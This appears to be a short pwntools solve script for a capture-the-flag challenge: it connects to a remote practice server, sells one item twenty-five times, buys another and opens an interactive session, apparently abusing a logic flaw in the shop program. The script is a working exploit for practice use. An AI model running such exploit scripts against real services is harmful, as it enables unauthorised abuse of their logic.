from pwn import *
#p = process("./pwn")
p = remote('node4.buuoj.cn',28542)
#context.log_level = 'debug'
def sale(i):
    p.sendlineafter('>1 ',str(3))
    p.sendlineafter('> ',str(i))
def buy(i):
    p.sendlineafter('> ',str(2))
    p.sendlineafter('> ',str(i))
def look():
    p.sendlineafter('> ',str(1))

for i in range(25):
    sale(0)
buy(1)
look()
p.interactive()